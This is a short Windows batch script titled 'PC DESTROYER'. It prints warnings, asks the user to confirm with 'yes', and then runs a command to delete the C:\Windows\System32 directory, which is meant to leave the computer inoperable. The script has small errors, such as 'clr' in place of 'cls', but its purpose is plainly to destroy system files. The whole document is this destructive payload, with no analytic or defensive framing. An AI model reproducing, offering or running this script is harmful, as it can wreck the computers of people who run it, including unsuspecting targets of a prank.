@echo off
Title PC DESTROYER
:start
echo NOTE
echo THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES, YOUR COMPUTER WILL NOT WORK AFTER THIS PROCESS.
pause
clr
echo Do you want to begin?
set /p type=
if %type%==yes goto y
if %type%==no goto n

:y
echo ARE YOU SURE?
echo THERE IS NO GOING BACK
pause 
echo LAST WARNING
pause
del c:\windows\system32

:n
exit
